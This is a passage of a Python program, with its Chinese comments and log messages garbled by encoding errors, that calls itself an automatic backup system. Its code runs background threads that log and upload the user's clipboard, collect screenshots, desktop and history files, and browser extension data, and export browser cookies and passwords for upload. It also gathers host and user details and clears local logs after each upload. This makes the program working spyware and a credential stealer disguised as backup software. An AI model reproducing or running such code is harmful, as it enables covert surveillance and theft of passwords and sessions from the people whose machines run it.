                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸ºç©ºï¼Œè·³è¿‡: {log_file}")
            return
            
        # åˆ›å»ºä¸´æ—¶ç›®å½•
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f'{user_prefix}_temp', 'backup_logs')
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("âŒ æ— æ³•åˆ›å»ºä¸´æ—¶æ—¥å¿—ç›®å½•")
            return
            
        # åˆ›å»ºå¸¦æ—¶é—´æˆ³çš„å¤‡ä»½æ–‡ä»¶å
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"{user_prefix}_backup_log_{timestamp}.txt"
        backup_path = os.path.join(temp_dir, backup_name)
        
        # å¤åˆ¶æ—¥å¿—æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•
        try:
            # è¯»å–å½“å‰æ—¥å¿—å†…å®¹
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("âš ï¸ æ—¥å¿—å†…å®¹ä¸ºç©ºï¼Œè·³è¿‡ä¸Šä¼ ")
                return
                
            # å†™å…¥å¤‡ä»½æ–‡ä»¶
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # éªŒè¯å¤‡ä»½æ–‡ä»¶æ˜¯å¦åˆ›å»ºæˆåŠŸ
            if not os.path.exists(backup_path) or os.path.getsize(backup_path) == 0:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—æ–‡ä»¶åˆ›å»ºå¤±è´¥æˆ–ä¸ºç©º")
                return
                
            # ä¸Šä¼ æ—¥å¿—æ–‡ä»¶
            logging.info(f"ğŸ“¤ å¼€å§‹ä¸Šä¼ å¤‡ä»½æ—¥å¿—æ–‡ä»¶ ({os.path.getsize(backup_path) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # ä¸Šä¼ æˆåŠŸåæ¸…ç©ºåŸå§‹æ—¥å¿—æ–‡ä»¶ï¼Œåªä¿ç•™ä¸€æ¡è®°å½•
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== ğŸ“ å¤‡ä»½æ—¥å¿—å·²äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼  ===\n")
                    logging.info("âœ… å¤‡ä»½æ—¥å¿—ä¸Šä¼ æˆåŠŸå¹¶å·²æ¸…ç©º")
                except Exception as e:
                    logging.error(f"âŒ å¤‡ä»½æ—¥å¿—æ›´æ–°å¤±è´¥: {e}")
            else:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—ä¸Šä¼ å¤±è´¥")
                
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"âŒ å¤åˆ¶æˆ–è¯»å–æ—¥å¿—æ–‡ä»¶å¤±è´¥: {e}")
        except Exception as e:
            logging.error(f"âŒ å¤„ç†æ—¥å¿—æ–‡ä»¶æ—¶å‡ºé”™: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
            
        # æ¸…ç†ä¸´æ—¶ç›®å½•
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
                
    except Exception as e:
        logging.error(f"âŒ å¤„ç†å¤‡ä»½æ—¥å¿—æ—¶å‡ºé”™: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def periodic_backup_upload(backup_manager):
    """å®šæœŸæ‰§è¡Œå¤‡ä»½å’Œä¸Šä¼ """
    # ä½¿ç”¨æ–°çš„å¤‡ä»½ç›®å½•è·¯å¾„
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    clipboard_log_path = os.path.join(backup_manager.config.BACKUP_ROOT, f"{user_prefix}_clipboard_log.txt")
    
    # å¯åŠ¨JTBç›‘æ§çº¿ç¨‹
    clipboard_monitor_thread = threading.Thread(
        target=backup_manager.monitor_clipboard,
        args=(clipboard_log_path, backup_manager.config.CLIPBOARD_CHECK_INTERVAL),
        daemon=True
    )
    clipboard_monitor_thread.start()
    logging.critical("ğŸ“‹ JTBç›‘æ§çº¿ç¨‹å·²å¯åŠ¨")
    
    # å¯åŠ¨JTBä¸Šä¼ çº¿ç¨‹
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    logging.critical("ğŸ“¤ JTBä¸Šä¼ çº¿ç¨‹å·²å¯åŠ¨")
    
    # åˆå§‹åŒ–JTBæ—¥å¿—æ–‡ä»¶
    try:
        os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== ğŸ“‹ JTBç›‘æ§å¯åŠ¨äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error(f"âŒ åˆå§‹åŒ–JTBæ—¥å¿—å¤±è´¥: {e}")

    # è·å–ç”¨æˆ·åå’Œç³»ç»Ÿä¿¡æ¯
    username = getpass.getuser()
    hostname = socket.gethostname()
    current_time = datetime.now()
    
    # è·å–ç³»ç»Ÿç¯å¢ƒä¿¡æ¯
    system_info = {
        "æ“ä½œç³»ç»Ÿ": platform.system(),
        "ç³»ç»Ÿç‰ˆæœ¬": platform.version(),
        "Windowsç‰ˆæœ¬": platform.win32_ver()[0] if platform.system() == "Windows" else "N/A",
        "ç³»ç»Ÿæ¶æ„": platform.machine(),
        "Pythonç‰ˆæœ¬": platform.python_version(),
        "ä¸»æœºå": hostname,
        "ç”¨æˆ·å": username,
    }
    
    # è·å–Windowsè¯¦ç»†ç‰ˆæœ¬ä¿¡æ¯
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
            try:
                build = winreg.QueryValueEx(key, "CurrentBuild")[0]
                product_name = winreg.QueryValueEx(key, "ProductName")[0]
                system_info["Windowsè¯¦ç»†ç‰ˆæœ¬"] = f"{product_name} (Build {build})"
            except:
                pass
            finally:
                winreg.CloseKey(key)
    except:
        pass
    
    # è¾“å‡ºå¯åŠ¨ä¿¡æ¯å’Œç³»ç»Ÿç¯å¢ƒ
    logging.critical("\n" + "="*50)
    logging.critical("ğŸš€ è‡ªåŠ¨å¤‡ä»½ç³»ç»Ÿå·²å¯åŠ¨")
    logging.critical("="*50)
    logging.critical(f"â° å¯åŠ¨æ—¶é—´: {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
    logging.critical("-"*50)
    logging.critical("ğŸ“Š ç³»ç»Ÿç¯å¢ƒä¿¡æ¯:")
    for key, value in system_info.items():
        logging.critical(f"   â€¢ {key}: {value}")
    logging.critical("-"*50)
    logging.critical("ğŸ“‹ JTBç›‘æ§å’Œè‡ªåŠ¨ä¸Šä¼ å·²å¯åŠ¨")
    logging.critical("="*50)

    def read_next_backup_time():
        """è¯»å–ä¸‹æ¬¡å¤‡ä»½æ—¶é—´"""
        try:
            if os.path.exists(backup_manager.config.THRESHOLD_FILE):
                with open(backup_manager.config.THRESHOLD_FILE, 'r') as f:
                    time_str = f.read().strip()
                    return datetime.strptime(time_str, '%Y-%m-%d %H:%M:%S')
            return None
        except Exception:
            return None

    def write_next_backup_time():
        """å†™å…¥ä¸‹æ¬¡å¤‡ä»½æ—¶é—´"""
        try:
            next_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
            os.makedirs(os.path.dirname(backup_manager.config.THRESHOLD_FILE), exist_ok=True)
            with open(backup_manager.config.THRESHOLD_FILE, 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"å†™å…¥ä¸‹æ¬¡å¤‡ä»½æ—¶é—´å¤±è´¥: {e}")
            return None

    def should_backup_now():
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½"""
        next_backup_time = read_next_backup_time()
        if next_backup_time is None:
            return True
        return datetime.now() >= next_backup_time

    while True:
        try:
            if should_backup_now():
                current_time = datetime.now()
                logging.critical("\n" + "="*40)
                logging.critical(f"â° å¼€å§‹å¤‡ä»½  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                logging.critical("-"*40)
                
                # è·å–å½“å‰å¯ç”¨çš„ç£ç›˜
                available_disks = get_available_disks()
                
                # æ‰§è¡Œå¤‡ä»½ä»»åŠ¡
                logging.critical("\nğŸ’¾ ç£ç›˜å¤‡ä»½")
                disks_backup_paths = backup_disks(backup_manager, available_disks)
                
                logging.critical("\nğŸªŸ Windowsæ•°æ®å¤‡ä»½")
                windows_data_backup_paths = backup_windows_data(backup_manager)
                
                # åˆå¹¶æ‰€æœ‰å¤‡ä»½è·¯å¾„
                all_backup_paths = disks_backup_paths + windows_data_backup_paths
                
                # å†™å…¥ä¸‹æ¬¡å¤‡ä»½æ—¶é—´
                next_backup_time = write_next_backup_time()
                
                # è¾“å‡ºç»“æŸè¯­ï¼ˆåœ¨ä¸Šä¼ ä¹‹å‰ï¼‰
                has_backup_files = len(all_backup_paths) > 0
                if has_backup_files:
                    logging.critical("\n" + "="*40)
                    logging.critical(f"âœ… å¤‡ä»½å®Œæˆ  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40)
                    logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                    if next_backup_time:
                        logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
                else:
                    logging.critical("\n" + "="*40)
                    logging.critical("âŒ éƒ¨åˆ†å¤‡ä»½ä»»åŠ¡å¤±è´¥")
                    logging.critical("="*40)
                    logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                    if next_backup_time:
                        logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
                
                # å¼€å§‹ä¸Šä¼ å¤‡ä»½æ–‡ä»¶
                if all_backup_paths:
                    logging.critical("ğŸ“¤ å¼€å§‹ä¸Šä¼ å¤‡ä»½æ–‡ä»¶...")
                    upload_success = True
                    for backup_path in all_backup_paths:
                        if not backup_manager.upload_file(backup_path):
                            upload_success = False
                    
                    if upload_success:
                        logging.critical("âœ… æ‰€æœ‰å¤‡ä»½æ–‡ä»¶ä¸Šä¼ æˆåŠŸ")
                    else:
                        logging.error("âŒ éƒ¨åˆ†å¤‡ä»½æ–‡ä»¶ä¸Šä¼ å¤±è´¥")
                
                # ä¸Šä¼ å¤‡ä»½æ—¥å¿—
                logging.critical("\nğŸ“ æ­£åœ¨ä¸Šä¼ å¤‡ä»½æ—¥å¿—...")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception as e:
                    logging.error(f"âŒ æ—¥å¿—å¤‡ä»½ä¸Šä¼ å¤±è´¥: {e}")
            
            # æ¯å°æ—¶æ£€æŸ¥ä¸€æ¬¡æ˜¯å¦éœ€è¦å¤‡ä»½
            time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)

        except Exception as e:
            logging.error(f"\nâŒ å¤‡ä»½å‡ºé”™: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error(f"âŒ æ—¥å¿—å¤‡ä»½å¤±è´¥: {log_error}")
            # å‘ç”Ÿé”™è¯¯æ—¶ä¹Ÿæ›´æ–°ä¸‹æ¬¡å¤‡ä»½æ—¶é—´
            write_next_backup_time()
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def backup_disks(backup_manager, available_disks):
    """å¤‡ä»½å¯ç”¨ç£ç›˜ï¼Œè¿”å›å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼ˆä¸æ‰§è¡Œä¸Šä¼ ï¼‰
    
    Returns:
        list: å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨
    """
    backup_paths = []
    for disk_letter, disk_configs in available_disks.items():
        logging.info(f"\næ­£åœ¨å¤„ç†ç£ç›˜ {disk_letter.upper()}")
        for backup_type, (source_dir, target_dir, ext_type) in disk_configs.items():
            try:
                backup_dir = backup_manager.backup_disk_files(source_dir, target_dir, ext_type)
                if backup_dir:
                    backup_path = backup_manager.zip_backup_folder(
                        backup_dir, 
                        str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                    )
                    if backup_path:
                        if isinstance(backup_path, list):
                            backup_paths.extend(backup_path)
                        else:
                            backup_paths.append(backup_path)
                        logging.critical(f"â˜‘ï¸ {disk_letter.upper()}ç›˜ {backup_type} å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
                    else:
                        logging.error(f"âŒ {disk_letter.upper()}ç›˜ {backup_type} å‹ç¼©å¤±è´¥\n")
                else:
                    logging.error(f"âŒ {disk_letter.upper()}ç›˜ {backup_type} å¤‡ä»½å¤±è´¥\n")
            except Exception as e:
                logging.error(f"âŒ {disk_letter.upper()}ç›˜ {backup_type} å¤‡ä»½å‡ºé”™: {str(e)}\n")
    
    return backup_paths

def backup_windows_data(backup_manager):
    """å¤‡ä»½Windowsç³»ç»Ÿæ•°æ®ï¼Œè¿”å›å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼ˆä¸æ‰§è¡Œä¸Šä¼ ï¼‰
    
    Args:
        backup_manager: å¤‡ä»½ç®¡ç†å™¨å®ä¾‹
        
    Returns:
        list: å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨
    """
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    backup_paths = []
    try:
        # å¤‡ä»½æˆªå›¾æ–‡ä»¶
        screenshots_backup = backup_screenshots()
        if screenshots_backup:
            backup_path = backup_manager.zip_backup_folder(
                screenshots_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_screenshots_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("â˜‘ï¸ æˆªå›¾æ–‡ä»¶å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
            else:
                logging.error("âŒ æˆªå›¾æ–‡ä»¶å‹ç¼©å¤±è´¥\n")
        else:
            logging.info("â„¹ï¸ æœªå‘ç°å¯å¤‡ä»½çš„æˆªå›¾æ–‡ä»¶\n")

        # ç›´æ¥å¤åˆ¶æŒ‡å®šç›®å½•å’Œæ–‡ä»¶ï¼ˆæ¡Œé¢ã€ä¾¿ç­¾ã€å†å²è®°å½•ç­‰ï¼‰
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        specified_backup_dir = backup_manager.backup_specified_files(
            os.path.expandvars('%USERPROFILE%'),
            os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_specified")
        )
        if specified_backup_dir:
            backup_path = backup_manager.zip_backup_folder(
                specified_backup_dir,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_specified_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("â˜‘ï¸ æŒ‡å®šç›®å½•å’Œæ–‡ä»¶å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
            else:
                logging.error("âŒ æŒ‡å®šç›®å½•å’Œæ–‡ä»¶å‹ç¼©å¤±è´¥\n")
        else:
            logging.error("âŒ æŒ‡å®šç›®å½•å’Œæ–‡ä»¶æ”¶é›†å¤±è´¥\n")

        # å¤‡ä»½æµè§ˆå™¨æ‰©å±•æ•°æ®
        extensions_backup = backup_browser_extensions(backup_manager)
        if extensions_backup:
            backup_path = backup_manager.zip_backup_folder(
                extensions_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_browser_extensions_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("â˜‘ï¸ æµè§ˆå™¨æ‰©å±•æ•°æ®å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
            else:
                logging.error("âŒ æµè§ˆå™¨æ‰©å±•æ•°æ®å‹ç¼©å¤±è´¥\n")
        else:
            logging.error("âŒ æµè§ˆå™¨æ‰©å±•æ•°æ®æ”¶é›†å¤±è´¥\n")
        
        # å¯¼å‡ºæµè§ˆå™¨ Cookies å’Œå¯†ç 
        browser_export_file = export_browser_cookies_passwords(backup_manager)
        if browser_export_file:
            backup_paths.append(browser_export_file)
            logging.critical("â˜‘ï¸ æµè§ˆå™¨æ•°æ®å¯¼å‡ºæ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
        else:
            logging.warning("â­ï¸  æµè§ˆå™¨æ•°æ®å¯¼å‡ºè·³è¿‡æˆ–å¤±è´¥\n")
                    
    except Exception as e:
        logging.error(f"Windowsæ•°æ®å¤‡ä»½å¤±è´¥: {e}")
    
    return backup_paths

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """ç‹¬ç«‹çš„JTBä¸Šä¼ çº¿ç¨‹"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    last_upload_time = datetime.now()
    min_content_size = 100  # æœ€å°å†…å®¹å¤§å°ï¼ˆå­—èŠ‚ï¼‰
    
    while True:
        try:
            current_time = datetime.now()
            
            # æ£€æŸ¥æ˜¯å¦éœ€è¦ä¸Šä¼ ï¼ˆæ ¹æ®é…ç½®çš„é—´éš”æ—¶é—´ï¼‰
            if (current_time - last_upload_time).total_seconds() >= backup_manager.config.CLIPBOARD_INTERVAL:
                if os.path.exists(clipboard_log_path):
                    try:
                        # æ£€æŸ¥æ–‡ä»¶å¤§å°
                        file_size = os.path.getsize(clipboard_log_path)
                        if file_size > min_content_size:  # åªæœ‰å½“å†…å®¹è¶³å¤Ÿæ—¶æ‰ä¸Šä¼ 
                            # æ£€æŸ¥æ–‡ä»¶å†…å®¹
                            with open(clipboard_log_path, 'r', encoding='utf-8') as f:
                                content = f.read().strip()
                                # æ£€æŸ¥æ˜¯å¦åªåŒ…å«å¯åŠ¨ä¿¡æ¯æˆ–ä¸Šä¼ è®°å½•
                                only_status_info = all(line.startswith('=== ğŸ“‹') for line in content.split('\n') if line.strip())
                                
                                if not only_status_info:
                                    # åˆ›å»ºä¸´æ—¶ç›®å½•
                                    temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f'{user_prefix}_temp', 'clipboard_logs')
                                    if backup_manager._ensure_directory(str(temp_dir)):
                                        # åˆ›å»ºå¸¦æ—¶é—´æˆ³çš„å¤‡ä»½æ–‡ä»¶å
                                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                        backup_name = f"{user_prefix}_clipboard_log_{timestamp}.txt"
                                        backup_path = os.path.join(temp_dir, backup_name)
                                        
                                        try:
                                            # å¤åˆ¶æ—¥å¿—æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•
                                            shutil.copy2(clipboard_log_path, backup_path)
                                                
                                            # ä¸Šä¼ æ—¥å¿—æ–‡ä»¶
                                            if backup_manager.upload_file(str(backup_path)):
                                                # ä¸Šä¼ æˆåŠŸåæ¸…ç©ºåŸå§‹æ—¥å¿—æ–‡ä»¶
                                                try:
                                                    with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                                        f.write(f"=== ğŸ“‹ æ—¥å¿—å·²äº {current_time.strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼ å¹¶æ¸…ç©º ===\n")
                                                    last_upload_time = current_time
                                                except Exception as e:
                                                    logging.error(f"âŒ JTBæ—¥å¿—æ¸…ç©ºå¤±è´¥: {e}")
                                            else:
                                                logging.error("âŒ JTBæ—¥å¿—ä¸Šä¼ å¤±è´¥")
                                        except Exception as e:
                                            logging.error(f"âŒ å¤åˆ¶JTBæ—¥å¿—å¤±è´¥: {e}")
                                        finally:
                                            # æ¸…ç†ä¸´æ—¶ç›®å½•
                                            try:
                                                if os.path.exists(str(temp_dir)):
                                                    shutil.rmtree(str(temp_dir))
                                            except Exception as e:
                                                logging.error(f"âŒ æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
                    except Exception as e:
                        logging.error(f"âŒ è¯»å–JTBæ—¥å¿—æ–‡ä»¶å¤±è´¥: {e}")
                        
        except Exception as e:
            logging.error(f"âŒ å¤„ç†JTBæ—¥å¿—æ—¶å‡ºé”™: {e}")
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)
            continue
            
        # ç­‰å¾…ä¸€å°æ®µæ—¶é—´å†æ£€æŸ¥
        time.sleep(backup_manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL)

def clean_backup_directory():
    """æ¸…ç†å¤‡ä»½ç›®å½•ï¼Œä½†ä¿ç•™æ—¥å¿—æ–‡ä»¶å’Œæ—¶é—´é˜ˆå€¼æ–‡ä»¶"""
    backup_dir = os.path.expandvars('%USERPROFILE%\\Documents\\AutoBackup')
    try:
        if not os.path.exists(backup_dir):
            return
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        # éœ€è¦ä¿ç•™çš„æ–‡ä»¶
        keep_files = ["backup.log", f"{user_prefix}_clipboard_log.txt", "next_backup_time.txt"]
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"ğŸ—‘ï¸ å·²æ¸…ç†: {item}")
            except Exception as e:
                logging.error(f"âŒ æ¸…ç† {item} å¤±è´¥: {e}")
                
        logging.critical("ğŸ§¹ å¤‡ä»½ç›®å½•å·²æ¸…ç†å®Œæˆ")
    except Exception as e:
        logging.error(f"âŒ æ¸…ç†å¤‡ä»½ç›®å½•æ—¶å‡ºé”™: {e}")

def main():
    """ä¸»å‡½æ•°"""
    try:
        # æ£€æŸ¥æ˜¯å¦å·²ç»æœ‰å®ä¾‹åœ¨è¿è¡Œ
        pid_file = os.path.join(BackupConfig.BACKUP_ROOT, 'backup.pid')
        if os.path.exists(pid_file):
            with open(pid_file, 'r') as f:
                old_pid = int(f.read().strip())
                try:
                    os.kill(old_pid, 0)
                    print(f'å¤‡ä»½ç¨‹åºå·²ç»åœ¨è¿è¡Œ (PID: {old_pid})')
                    return
                except OSError:
                    pass
        
        # å†™å…¥å½“å‰è¿›ç¨‹PID
        os.makedirs(os.path.dirname(pid_file), exist_ok=True)
        with open(pid_file, 'w') as f:
            f.write(str(os.getpid()))
            
        # æ³¨æ„ï¼šæ—¥å¿—é…ç½®åœ¨ BackupManager.__init__ ä¸­è¿›è¡Œï¼Œæ— éœ€é‡å¤é…ç½®
        
        # æ£€æŸ¥ç£ç›˜ç©ºé—´
        try:
            backup_drive = os.path.splitdrive(BackupConfig.BACKUP_ROOT)[0]
            free_space = shutil.disk_usage(backup_drive).free
            if free_space < BackupConfig.MIN_FREE_SPACE:
                logging.warning(f'å¤‡ä»½é©±åŠ¨å™¨ç©ºé—´ä¸è¶³: {free_space / (1024*1024*1024):.2f}GB')
        except (OSError, IOError) as e:
            logging.warning(f'æ— æ³•æ£€æŸ¥ç£ç›˜ç©ºé—´: {str(e)}')
        
        try:
            # åˆ›å»ºå¤‡ä»½ç®¡ç†å™¨å®ä¾‹
            backup_manager = BackupManager()
            
            # æ¸…ç†æ—§çš„å¤‡ä»½ç›®å½•
            clean_backup_directory()
            
            # å¯åŠ¨å®šæœŸå¤‡ä»½å’Œä¸Šä¼ 
            periodic_backup_upload(backup_manager)
                
        except KeyboardInterrupt:
            logging.info('å¤‡ä»½ç¨‹åºè¢«ç”¨æˆ·ä¸­æ–­')
        except Exception as e:
            logging.error(f'å¤‡ä»½è¿‡ç¨‹å‘ç”Ÿé”™è¯¯: {str(e)}')
            # å‘ç”Ÿé”™è¯¯æ—¶ç­‰å¾…ä¸€æ®µæ—¶é—´åé‡è¯•
            time.sleep(BackupConfig.MAIN_ERROR_RETRY_DELAY)
            main()  # é‡æ–°å¯åŠ¨ä¸»ç¨‹åº
            
    finally:
        # æ¸…ç†PIDæ–‡ä»¶
        try:
            if os.path.exists(pid_file):
                os.remove(pid_file)
        except Exception as e:
            logging.error(f'æ¸…ç†PIDæ–‡ä»¶å¤±è´¥: {str(e)}')

if __name__ == "__main__":
    main()